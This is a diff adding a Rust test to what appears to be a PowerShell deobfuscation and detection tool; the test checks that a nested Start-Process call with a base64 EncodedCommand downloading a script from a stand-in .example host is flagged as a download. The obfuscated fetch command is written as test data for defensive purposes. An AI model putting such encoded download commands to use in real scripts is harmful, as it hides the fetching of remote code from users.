@@ -11989,6 +11989,31 @@ Invoke-WebRequest -Uri $k[0] -OutFile stage.bin
     }
 
     #[test]
+    fn nested_start_process_argumentlist_unquoted_array_encodedcommand_resolves_url() {
+        let decoded = "Invoke-WebRequest https://start-unquoted-array.example/p.ps1";
+        let ps = format!(
+            r#"Start-Process powershell.exe -ArgumentList -NoP,-EncodedCommand,{}"#,
+            encode_utf16(decoded)
+        );
+        let script = format!("powershell -Command \"{}\"\r\n", ps.replace('"', "\\\""));
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        | Trait::DownloadInDeobText { src, .. }
+                        if src == "https://start-unquoted-array.example/p.ps1"
+                )
+            }),
+            "nested Start-Process ArgumentList unquoted array EncodedCommand URL missed: {:?}\ndeob:\n{}",
+            report.traits,
+            report.extracted_ps1_normalized.join("\n---\n")
+        );
+    }
+
+    #[test]
     fn nested_start_process_argumentlist_at_array_encodedcommand_resolves_url() {
         let decoded = "Invoke-WebRequest https://start-at-array.example/p.ps1";
         let ps = format!(
